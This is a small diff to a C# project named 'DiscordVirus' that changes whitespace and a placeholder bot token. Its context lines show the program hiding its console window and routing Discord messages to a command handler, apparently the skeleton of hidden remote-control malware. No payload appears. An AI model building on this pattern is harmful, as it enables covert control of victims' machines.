@@ -28,7 +28,7 @@ namespace DiscordVirus
 
         public async Task MainAsync()
         {
-
+            
             const int SW_HIDE = 0;
             //const int SW_SHOW = 5;
             var handle = GetConsoleWindow();
@@ -39,7 +39,7 @@ namespace DiscordVirus
             _client.MessageReceived += CommandHandler;
             _client.Log += Log;
 
-            var token = "BOT_TOKEN";
+            var token = "Your_token_here";
 
 
 
